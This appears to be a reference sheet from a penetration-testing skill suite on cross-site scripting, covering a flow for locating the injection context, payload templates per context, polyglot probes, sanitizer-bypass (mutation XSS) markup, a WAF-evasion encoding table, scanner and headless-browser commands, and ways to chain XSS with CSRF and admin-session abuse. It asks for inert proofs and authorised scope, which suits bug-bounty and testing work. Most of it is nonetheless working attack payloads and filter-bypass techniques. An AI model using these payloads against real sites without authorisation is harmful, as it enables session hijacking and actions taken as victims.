# Payloads, probes, encodings & tools — xss-testing

All templates use `<PLACEHOLDER>` slots — substitute `<TARGET>`, `<PARAM>`, `<PROOF>`,
`<OOB_DOMAIN>`, etc. Proof markers stay inert: `alert(document.domain)`, a `<zz…>` DOM
element, or a ping to **your own** collaborator domain. Never exfiltrate real users' data.

Placeholder glossary:

| Placeholder | Meaning |
|---|---|
| `<TARGET>` | In-scope host (host + port) |
| `<PATH>` | In-scope path |
| `<PARAM>` | Parameter under test |
| `<PROOF>` | Inert proof function, e.g. `alert(document.domain)` |
| `<MARKER>` | Inert tag/text probe, e.g. `zz1` |
| `<OOB_DOMAIN>` | Your collaborator/hook domain (Burp, interactsh, VPS) |
| `<UNIQ>` | Unique ID per field/payload so callbacks are attributable |
| `<FRAMEWORK>` | Detected framework: `angular1` / `vue2` / `vue3` / `svelte` |
| `<SANITIZER>` | Detected sanitizer: `dompurify` / `sanitize-html` / custom |

---

## 1. Context-disambiguation flow: where is the input? → which payload family

Run this in order; stop at the first question you can answer from a probe:

```
Q0. Does the input come back at all (same request, later request, or only client-side)?
    ├─ same request            → V-02 family        → go Q1
    ├─ later request / stored  → V-04 (then V-05 if you can't see the render)
    ├─ never in a response, but flows in JS
    │                            → V-03 DOM family   → go Q6
    └─ only after a later visit/cache/other user → V-15, V-16

Q1. Where in the raw response bytes does the probe sit?
    ├─ between tags, plain text            → HTML text family        (§2.1)
    ├─ inside an attribute value           → go Q2
    ├─ inside <script> / a JS file region  → go Q3
    ├─ inside an event-handler attribute   → event-handler family    (§2.4)
    ├─ inside href/src/action/formaction   → URL/URI family          (§2.5)
    ├─ inside <title>/<textarea>/<style>/<comment> → close delimiter first (§2.1 note)
    ├─ inside VBScript context (legacy IE) → VBScript family         (§2.6)
    └─ HTML entities/Unicode survive raw   → V-12 (decode-order problem)

Q2. Attribute details:
    ├─ double-quoted  → "><breakout family     (§2.2)
    ├─ single-quoted  → '><breakout family     (§2.2)
    ├─ unquoted       → whitespace + handler   (§2.2)
    └─ URL-valued attribute (href/src/...)     → §2.5 + go Q5

Q3. JavaScript string context: which quoting?
    ├─ single-quoted   → '; breakout           (§2.3)
    ├─ double-quoted   → "; breakout           (§2.3)
    ├─ backtick/`      → ${} or ` breakout     (§2.3)
    ├─ numeric / bare expression → comma breakout (§2.3)
    └─ JSON embedded in <script> → break the script tag first: </script><zz>

Q4. (often parallel to Q1) Does a framework interpolate the value ({{ }}, ${})?
    └─ yes → V-08 CSTI family (§2.7), not an HTML breakout

Q5. Content-Type sane? (§2.5 URL payloads only fire if the response renders as HTML)
    ├─ text/html                         → proceed
    └─ wrong/missing type, no nosniff    → V-17 first, it may be the whole bug

Q6. Client-side only: source → sink?
    ├─ sink is innerHTML-family           → HTML/attribute payloads  (§2.1/§2.2)
    ├─ sink is eval/Function/timeout-str  → indirect-eval family     (§2.8)
    ├─ sink reads sanitizer output twice  → mXSS family              (§2.9)
    ├─ sink fed by polluted proto         → V-09: pollute + trigger, two steps
    └─ file/format rendered (SVG/MD/XML)  → V-14 family              (§2.10)
```

Rule of thumb: **the probe decides the family, not the URL.** `/search?x=` looks like a
text-context reflection until the probe shows it's an unquoted attribute.

---

## 2. Representative payload templates per context

### 2.1 HTML text context

```html
<zz<MARKER>>
</script><zz<MARKER>>                       <!-- if inside/near a script boundary -->
</title><zz<MARKER>></title>                 <!-- if inside <title> -->
</textarea><zz<MARKER>></textarea>           <!-- if inside <textarea> -->
</style><zz<MARKER>></style>                 <!-- if inside <style> -->
--><zz<MARKER>>                              <!-- if inside an HTML comment -->
```
Proof version: replace `<zz<MARKER>>` with `<img src=x onerror="<PROOF>">`.

### 2.2 Attribute context

```html
"><zz<MARKER>>
'><zz<MARKER>>
" autofocus onfocus="<PROOF>" x="          <!-- double-quoted, no '>' available -->
' autofocus onfocus='<PROOF>' x='          <!-- single-quoted -->
autofocus onfocus=<PROOF> x=               <!-- UNQUOTED: first space ends the value -->
" onmouseover="<PROOF>" data-x="          <!-- existing handler to piggyback on -->
```

### 2.3 JavaScript context (inside a `<script>` or JS file)

```javascript
';<PROOF>;//                                <!-- single-quoted string -->
";<PROOF>;//                                <!-- double-quoted string -->
</script><script><PROOF>()</script>         <!-- break out of the script tag itself -->
1;<PROOF>()                                 <!-- numeric / bare-expression slot -->
`;<PROOF>()                                 <!-- template literal -->
${'<PROOF>()'}                              <!-- inside an existing ${} interpolation -->
<!-- inside JSON-in-script: break the tag first (line above), never fight JSON escapes -->
```

### 2.4 Event-handler context

```html
" onerror="<PROOF>" x="                     <!-- img onerror pattern -->
" autofocus onfocus="<PROOF>" x="           <!-- needs focus, no navigation -->
" onmouseover="<PROOF>" x="                 <!-- click/hover required — note in report -->
"><svg onload="<PROOF>">                    <!-- load-time, no interaction -->
" onanimationstart="<PROOF>" style="animation:x
```
Report interaction honestly: `onerror`/`onload` = no click; `onmouseover`/`onfocus` = user
gesture. Severity differs.

### 2.5 URL / URI context (href, src, action, formaction, xlink:href)

```html
javascript:<PROOF>()                        <!-- <a href>: requires click; <iframe src>: auto -->
javascript://%0a<PROOF>()                   <!-- comment-trick for some filters -->
data:text/html,<zz<MARKER>>                 <!-- where data: in navigation isn't blocked -->
data:text/html;base64,<BASE64-OF-MARKUP>
```
Placeholders: base64 of an inert `<script><PROOF>()</script>` document only. Check the
target actually *navigates* to the URL (link vs. image src — `<img src="javascript:...">`
never fires).

### 2.6 VBScript context (legacy IE only)

```vbscript
msgbox "<PROOF>"                            <!-- only meaningful for pinned old-IE targets -->
```
Treat as a footnote unless scope names legacy IE; modern Chromium/Firefox parse nothing here.

### 2.7 Framework expression context (CSTI — V-08)

```text
{{7*7}}                                     <!-- detection probe: renders 49? -->
${7*7}                                      <!-- Vue 2 mustache probe -->
{{constructor.constructor('<PROOF>()')()}}   <!-- AngularJS constructor-chain family -->
{{constructor.constructor('return this')().x}} <!-- version-dependent gadget scaffold -->
```
Detection probes are inert arithmetic — escalate to the constructor-chain only after `49`
renders in the **live DOM**.

### 2.8 Indirect-eval sink context (V-13)

```javascript
<PROOF>()                                   <!-- direct expression slot -->
alert(document.domain)//                    <!-- JSONP-style callback param -->
');<PROOF>();//                             <!-- string that closes into eval'd code -->
1; setTimeout("<PROOF>()", 100)             <!-- only if the sink passes a string through -->
```

### 2.9 Mutation / sanitizer context (V-07)

Namespace-switching scaffold (adjust per sanitizer version):
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=<PROOF>>
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=<PROOF>&gt;">
<svg></p><style><g title="</style><img src=x onerror=<PROOF>>">
```
Test procedure: `el.innerHTML = sanitizerOutput; el.innerHTML = el.innerHTML;` — the
handler should appear only after the round-trip.

### 2.10 File/format vectors (V-14)

SVG (served `image/svg+xml`, fetched directly — not via `<img>`):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="<PROOF>()"><text>zz</text></svg>
```
Markdown (raw HTML mode): `<img src=x onerror=<PROOF>>`
Markdown (safe-mode attribute smuggling): `![zz](x "onerror=<PROOF>")`
XML/XSLT: `<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" ...>` with `script` output — template skeleton only, fill after confirming XSLT is applied.

---

## 3. Detection / polyglot probe set (non-destructive)

Ordered from quietest to loudest. Every marker is inert: text node, tag name, or
`alert(document.domain)`. **No exfiltration of real user data — ever.**

| # | Probe | What a hit tells you |
|---|---|---|
| 1 | `zz<UNIQ>` | Plain-text reflection (baseline — every param gets this) |
| 2 | `<zz1>` | HTML text context, `<` not encoded |
| 3 | `"><zz2>` | Double-quoted attribute breakout |
| 4 | `'><zz3>` | Single-quoted attribute breakout |
| 5 | `" autofocus onfocus=zz4 x=` | Unquoted attribute / handler slot |
| 6 | `</script><zz5>` | JS-in-script or script-boundary reflection |
| 7 | `{{7*7}}` / `${7*7}` | Client-side template evaluation (V-08) |
| 8 | `<zz6><!--` | Comment context / parser nesting quirk |
| 9 | `#zz7` (fragment) | DOM-source reflection only visible client-side (V-03) |

Polyglot probe (fires in text, attribute, comment, title, and script-adjacent contexts —
single request when context is unknown):
```text
jaVasCript:/*-/*`/*'/*"/**/(/* </zz8> <zz8> */) <zz9> "
```
Fire-and-reduce variant (proof-grade, still inert):
```text
"-'><zz9 onerror=alert(document.domain)>   <!-- works: unquoted attr, text, single/double attr -->
```
Angular-flavored polyglot (only if AngularJS detected): `{{constructor.constructor('alert(document.domain)')()}}`

Delivery habit: put `<UNIQ>` in every probe so a later hit (especially blind, V-05) tells
you *which* parameter and *which* rung of the ladder fired.

---

## 4. WAF-evasion encoding table

Take a working baseline payload `<BASE>` (e.g. `<img src=x onerror=alert(document.domain)>`)
and transform one technique per request. Re-test the full ladder only after Q1 of the
disambiguation flow is answered — encoding never fixes a wrong context.

| Technique | Example transform | Notes / gotchas |
|---|---|---|
| Single URL encoding | `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` | Baseline; any decoder does this once |
| **Double URL encoding** | `%253Cimg%2520src%253Dx...` | Only works if app decodes **twice** (server-side double-decode); browsers do NOT double-decode URLs — a hit must come from the server path, verify in DOM |
| HTML entity (hex) | `&#x3C;img src=x onerror=alert(1)&#x3E;` | Decoded when entity lands in HTML parse; must appear where parser decodes entities (text/attr), not in JS strings |
| HTML entity (decimal) | `&#60;img src=x onerror=alert(1)&#62;` | Same as above; mix bases to dodge single-signature rules |
| Nested / double entity | `&amp;lt;` → decodes once to `&lt;`, twice to `<` | Classic "WAF sees `&lt;`, app/browser sees `<`" mismatch |
| **Case mixing** | `<ImG sRc=x oNeRrOr=alert(1)>` | HTML tags/attrs are case-insensitive — cheap and still effective against lazy signatures |
| **Comment splitting** | `<scr<!--ipt>` , `onerror=/*x*/alert(1)` | HTML comment inside tag name gets stripped by parser; WAF regex misses `<script` |
| Tag-boundary whitespace | `<img%0asrc=x%0aonerror=alert(1)>` , `<img/src=x onerror=...>` | Newline/`/` accepted as separators by the HTML tokenizer |
| **Unicode escapes (JS context)** | `al\u0063ert(1)` , `\u{61}lert(1)` | Only where the string reaches a JS parser (script context, eval sink) — meaningless in HTML text |
| JSON unicode | `"\u003cimg ..."` inside embedded JSON | Decoded only if app JSON-decodes before render; often the sanitizer runs *before* this decode = your bypass ordering test |
| JS string concatenation | `al+'ert'(1)` style split forms | For keyword filters, not HTML filters; needs eval-ish context |
| Base64 / data URI | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | URL context only; `data:` blocked in many `frame-src`/navigate configs |
| **Unicode overlong UTF-8** | `%C0%BC` for `<` | ⚠ **Dead in modern browsers** (UTF-8 strict mode) — only cite for legacy/IE-pinned targets, don't waste ladder rungs on Chrome/Firefox |
| UTF-7 | `+ADw-script+AD4-` | ⚠ Legacy IE with `charset=utf-7` only; effectively extinct — footnote, not a finding |
| Null byte split | `%00`, `<scri%00pt>` | Legacy parsers only (old IE/IIS); note but don't rely on |
| Mixed-encoding chains | entity-inside-double-URL: `%2526%2523x3C%253B` | The real WAF-killer: two layers, each individually sanitized elsewhere; always verify the **final** DOM state |

Verification rule for every row: a bypass is only a bypass when **(a)** the WAF/naive
baseline was blocked in the same session, **(b)** the response contains your raw (or
decodable) markup, and **(c)** a real browser renders it as active markup. Two out of three
is a lead.

---

## 5. Tool command templates

All commands are templates — substitute placeholders, confirm scope first.

```bash
# Passive: collect URLs+params from a crawl, filter to XSS-shaped reflections
cat <OUT>/urls.txt | grep -E '(\?|&)[a-z_]+=' | sort -u > params.txt

# dalfox — parameter scanning from a URL list (pipe mode)
cat params.txt | dalfox pipe --silent \
  --header 'Cookie: <SESSION_COOKIE>' \
  --worker 30 --timeout 10 --format json > dalfox.json

# dalfox — one high-value URL with custom proof payload
dalfox url 'https://<TARGET>/<PATH>?<PARAM>=<SEED>' \
  --payload '<img src=x onerror=alert(document.domain)>' \
  --blind '<OOB_DOMAIN>' --skip-bav --mining-dict

# kxss — reflection pass (stdin URLs; look for its "reflection" lines per param)
cat params.txt | kxss | tee kxss.txt

# gf + dalfox combo — pattern-select XSS-prone params first
cat urls.txt | gf xss | httpx -silent -mc 200 | dalfox pipe

# Source→sink hunt in frontend bundles (V-03 / V-09)
grep -rnoE 'innerHTML|document\.write|eval\(|new Function|setTimeout\([^,)]*["'"'"']' <BUNDLE_DIR>
grep -rnoE 'location\.(hash|search|href)|document\.URL|postMessage|localStorage\.get' <BUNDLE_DIR>
grep -rnoE '\$\.extend\(true|__proto__|constructor\.prototype' <BUNDLE_DIR>   # V-09 merge sinks
grep -rno 'trustedTypes.createPolicy' <BUNDLE_DIR>                            # V-18 policies

# nuclei — XSS template suites (keep out-of-band templates pointed at YOUR OOB domain)
nuclei -l urls.txt -t http/fuzzing/xss/ -dol --rate-limit 50
nuclei -l urls.txt -tags xss -severity critical,high,medium \
  -var target=<TARGET> -var oob=<OOB_DOMAIN>

# Custom minimal nuclei-style template skeleton (write to xss-marker.yaml)
cat > xss-marker.yaml <<'EOF'
id: xss-reflected-marker
info:
  name: Reflected XSS marker probe
  severity: info
http:
  - raw:
      - |
        GET /<PATH>?<PARAM>=<zzprobe123> HTTP/1.1
        Host: {{TargetHostname}}
    matchers:
      - type: word
        part: body
        words: ["<zzprobe123>"]
        negative: false
EOF

# Confirm execution in a real browser (headless chromium marker check)
chromium --headless --disable-gpu --virtual-time-budget=5000 \
  --dump-dom 'https://<TARGET>/<PATH>?<PARAM>=<PAYLOAD>' 2>&1 | grep -c 'zzprobe'

# Playwright (python) full login+sweep harness — two self-interference traps that
# masquerade as app behavior (learned on Outlaw 2026-10-23):
# 1) Program-mandated custom headers (e.g. X-Inspectiv-Tester) must be scoped to
#    in-scope hosts via ctx.route — sending them on cross-origin subrequests
#    (identitytoolkit.googleapis.com) adds them to the CORS preflight, the third
#    party 403s the preflight, and Firebase login dies with
#    auth/network-request-failed that looks like a network/app bug but is yours.
ctx.route('**/*', lambda r: r.continue_(
    headers={**r.request.headers, 'X-Inspectiv-Tester': H}
    if 'inscope.host' in r.request.url
    else {k: v for k, v in r.request.headers.items()
          if k.lower() != 'x-inspectiv-tester'}))
# 2) Cached browser build may lag the playwright package (chromium-1234 vs 1248):
#    point executable_path at the cached binary instead of reinstalling.
# Always assert login actually succeeded (page.url + a known post-login heading)
# before trusting sweep results — every protected SPA route silently redirects to
# the login page, so a failed login tests the login view, not your routes.

# Collaborator-style OOB watch (blind, V-05) — interactsh example
interactsh-client -v | grep -E 'i=<UNIQ>'
```

Differential testing beats raw volume: run the naive baseline first, then the encoded
ladder, and only escalate payloads that the baseline proves are being *filtered* (see §4).

---

## 6. Chain it with (the suite)

| Chain | Direction | When / how |
|---|---|---|
| **`csrf-testing`** | XSS → CSRF | XSS largely *replaces* CSRF (same-origin JS can act as the victim) — but where reading a token needs it: use XSS to `fetch()` the token from a form page, then submit. Also covers the reverse: a CSRF that *plants* the stored XSS payload (CSRF → stored XSS, e.g. CSRF-able comment form with HTML allowed). Report as an XSS finding with CSRF as the delivery note; dedupe against a pure-CSRF report of the same form. |
| **`path-traversal-testing`** | LFI/RFI → XSS | Log poisoning → include attacker-controlled log lines in an HTML page (`<?php echo ... ?>` variants for RCE side, plain HTML for XSS); traversal that reads a reflected-parameter file into the page (LFI-to-XSS); RFI loading a remote script into an inline include context. Also the reverse: XSS exfiltrating traversal-found secrets (`/proc/self/environ` in a client-side previewer). See `path-traversal-testing` for wrapper/encoding detail. |
| **`business-logic-testing`** | XSS → logic abuse | Blind XSS (V-05) in an admin browser as the *actuator* for a logic flaw: force the admin's session to approve/escalate/bypass a workflow step the attacker can't reach; XSS-driven automation of an OTP/price-step the victim legitimately has access to; scripted replay of an under-validated workflow with the victim's cookies. Severity = logic-flaw impact + XSS delivery. |
| `sqli-testing` | SQLi → XSS | Error/union channels that reflect into HTML; stacked writes that plant stored XSS in content tables. |
| `info-disclosure-testing` | Info leak → XSS | Leaked JS source/sourcemaps reveal client sinks & gadgets (V-03/V-09 recon); leaked sanitizer versions → known mXSS bypasses (V-07). |
| `rce-testing` / `ssrf-testing` | SSTI/SSTI-adjacent | Server-side `{{7*7}}` = SSTI not CSTI (see V-08 false positives) — route it to `rce-testing`; SSRF-to-local-preview-service can render your HTML → `ssrf-testing`. |
| `sandbox-escape-testing` | Sandbox chain | DOM clobbering / TT policy injection (V-18) meeting a JS sandbox; use when the sink sits behind an in-app sandbox rather than the browser origin. |
| `bac-idor-testing` | Access control + XSS | Confirming *who else* can view the stored/blind payload field (admin-only render path) usually needs IDOR/BAC techniques to enumerate. |

Primary working chains in practice: **XSS → CSRF** (same form, different claim),
**path traversal → XSS** (poisoned include), and **XSS → business logic** (admin-browser
actuator) — the three named above are the ones most reports will actually need.
